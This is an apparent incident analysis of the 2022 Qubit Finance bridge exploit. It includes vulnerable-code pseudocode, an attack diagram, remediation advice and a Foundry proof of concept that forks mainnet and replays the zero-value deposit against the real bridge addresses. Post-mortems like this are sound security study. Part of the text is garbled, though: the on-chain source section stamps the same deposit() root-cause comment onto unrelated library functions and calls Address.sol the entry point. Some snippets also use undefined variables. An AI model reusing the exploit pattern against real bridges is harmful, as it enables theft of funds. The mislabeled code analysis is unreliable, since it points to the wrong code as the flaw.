# Qubit Finance — Zero-Address Whitelist Exploit Bridge Takeover Analysis

| Field | Details |
|------|------|
| **Date** | 2022-01-28 |
| **Protocol** | Qubit Finance |
| **Chain** | Ethereum → BSC |
| **Loss** | ~$80,000,000 (xETH-based BSC collateral drained) |
| **Attacker** | [0xD01Ae1A708614948B2B5e0B7AB5be6AFA01325c7](https://etherscan.io/address/0xD01Ae1A708614948B2B5e0B7AB5be6AFA01325c7) |
| **Attack Tx** | Block 14,090,169 |
| **Vulnerable Contract** | QBridge [0x20E5E35ba29dC3B540a1aee781D0814D5c77Bce6](https://etherscan.io/address/0x20E5E35ba29dC3B540a1aee781D0814D5c77Bce6) |
| **Root Cause** | The `deposit()` function treated the zero address (0x0000...0000) as a valid whitelisted token, allowing xETH to be minted on BSC without any ETH being transferred |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-01/Qubit_exp.sol) |

---
## 1. Vulnerability Overview

Qubit Finance's QBridge is a contract that bridges assets between Ethereum and BSC. When a user deposits ETH on Ethereum, xETH is minted on BSC. The bridge manages supported tokens via the `resourceIDToTokenContractAddress` mapping, and since ETH is a native asset, the **zero address (0x000...000)** was registered for it.

The attacker called the `deposit()` function specifying the zero address as the token without sending any actual ETH. The contract accepted the zero address as a valid whitelist entry and processed it through the generic ERC20 path rather than the `depositETH` logic. As a result, xETH was minted on BSC without any assets having been deposited.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable QBridgeHandler.deposit() (pseudocode)
function deposit(
    bytes32 resourceID,
    address depositer,
    bytes calldata data
) external onlyBridge {
    address tokenAddress = _resourceIDToTokenContractAddress[resourceID];

    // ❌ Zero address is registered in the whitelist, so this passes
    require(_contractWhitelist[tokenAddress], "token not whitelisted");

    // ❌ When tokenAddress == address(0), ERC20 transferFrom call is skipped
    // Does not verify whether native ETH was actually transferred
    if (tokenAddress != address(0)) {
        uint256 amount = abi.decode(data, (uint256));
        IERC20(tokenAddress).transferFrom(depositer, address(this), amount);
    }
    // ❌ else branch: emits event without validating actual ETH msg.value
    emit Deposit(destinationChainID, resourceID, depositNonce);
}

// ✅ Correct pattern
function deposit(...) external payable onlyBridge {
    address tokenAddress = _resourceIDToTokenContractAddress[resourceID];
    require(_contractWhitelist[tokenAddress], "token not whitelisted");

    if (tokenAddress == address(0)) {
        // ✅ Validate native ETH receipt
        require(msg.value == amount, "ETH amount mismatch");
    } else {
        IERC20(tokenAddress).transferFrom(depositer, address(this), amount);
    }
}
```

---
### On-Chain Source Code

Source: Sourcify verified


**Address.sol** — Entry point:
```solidity
// ❌ Root cause: `deposit()` function treats zero address (0x0000...0000) as a valid whitelisted token, allowing xETH to be minted on BSC without any ETH being transferred
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
```

**ERC1967Upgrade.sol** — Related contract:
```solidity
// ❌ Root cause: `deposit()` function treats zero address (0x0000...0000) as a valid whitelisted token, allowing xETH to be minted on BSC without any ETH being transferred
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation;
    }
```

**Proxy.sol** — Related contract:
```solidity
// ❌ Root cause: `deposit()` function treats zero address (0x0000...0000) as a valid whitelisted token, allowing xETH to be minted on BSC without any ETH being transferred
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            // Copy msg.data. We take full control of memory in this inline assembly
            // block because it will not return to Solidity code. We overwrite the
            // Solidity scratch pad at memory position 0.
            calldatacopy(0, 0, calldatasize())

            // Call the implementation.
            // out and outsize are 0 because we don't know the size yet.
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)

            // Copy the returned data.
            returndatacopy(0, 0, returndatasize())

            switch result
            // delegatecall returns 0 on error.
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (Ethereum)
    │
    ├─[1] Query resourceID
    │       QBridgeHandler.resourceIDToTokenContractAddress(resourceID)
    │       → Returns: 0x0000000000000000000000000000000000000000 (zero address)
    │
    ├─[2] Check contractWhitelist
    │       QBridgeHandler.contractWhitelist(address(0))
    │       → true (zero address is in the whitelist!)
    │
    ├─[3] Call QBridge.deposit()
    │       destinationDomainID = 1 (BSC)
    │       resourceID = resourceID for ETH
    │       data = abi.encode(massive xETH mint request)
    │       ETH sent: 0 wei
    │
    ├─[4] Bridge relayer confirms xETH mint on BSC
    │       (Trusts Ethereum event and approves BSC mint)
    │
    └─[5] Borrow against entire Qubit protocol collateral using minted xETH on BSC
            Loss: ~$80,000,000
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IQBridge {
    function deposit(
        uint8 destinationDomainID,
        bytes32 resourceID,
        bytes calldata data
    ) external payable;
}

interface IQBridgeHandler {
    function resourceIDToTokenContractAddress(bytes32 resourceID)
        external view returns (address);
    function contractWhitelist(address token)
        external view returns (bool);
}

contract ContractTest is Test {
    IQBridge qBridge =
        IQBridge(0x20E5E35ba29dC3B540a1aee781D0814D5c77Bce6);
    IQBridgeHandler qBridgeHandler =
        IQBridgeHandler(0x17B7163cf1Dbd286E262ddc68b553D899B93f526);

    function setUp() public {
        vm.createSelectFork("mainnet", 14_090_169);
    }

    function testExploit() public {
        vm.startPrank(0xD01Ae1A708614948B2B5e0B7AB5be6AFA01325c7);

        // [Step 1] Set resourceID for ETH
        bytes32 resourceID = 0x0000000000000000000000a850A05aC2623D70a5CF3dBFbF61f6c1cA0F1B2000;

        // [Step 2] Verify zero address is in the whitelist
        address tokenAddr = qBridgeHandler.resourceIDToTokenContractAddress(resourceID);
        bool whitelisted = qBridgeHandler.contractWhitelist(tokenAddr);
        emit log_named_address("Token Address (should be 0x0)", tokenAddr);
        emit log_named_string("Is whitelisted", whitelisted ? "YES - VULNERABLE" : "NO");

        // [Step 3] Call deposit with 0 wei ETH
        // ⚡ Key: triggers large xETH mint event without actual ETH
        bytes memory data = abi.encode(uint256(0xa4cc799563c380000)); // equivalent to 47 ETH

        qBridge.deposit{value: 0}(
            1,          // destinationDomainID: BSC
            resourceID, // resourceID for ETH bridge
            data        // requested mint amount
        );

        vm.stopPrank();
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Improper Input Validation |
| **CWE** | CWE-20: Improper Input Validation |
| **OWASP DeFi** | Missing bridge asset validation |
| **Attack Vector** | Zero-address whitelist + deposit with no ETH transfer |
| **Precondition** | Zero address registered in the whitelist |
| **Impact** | Unlimited xETH minting on BSC |

---
## 6. Remediation Recommendations

1. **Special handling for zero address**: When processing native token (ETH) transfers, always compare and validate `msg.value` against the requested amount.
2. **Separate whitelist logic**: Handle ERC20 tokens and native assets through distinct code paths to prevent conflation.
3. **Strengthen bridge relayer validation**: Do not trust events alone; verify on-chain that assets are actually locked.
4. **Prohibit zero-address whitelisting**: Never register `address(0)` in the whitelist under any circumstances.

---
## 7. Lessons Learned

- **Danger of the zero address**: Treating a sentinel address (0x000...000) identically to regular tokens creates a critical vulnerability.
- **Core of bridge security**: In cross-chain bridges, verifying that "assets are actually locked on the source chain" is paramount.
- **$80M loss**: One of the largest DeFi bridge hacks at the time, demonstrating how catastrophic the absence of a single input validation check can be.
- **Whitelist design**: A whitelist is an allowlist, but its design must be reviewed to ensure it does not include "dangerous sentinel values."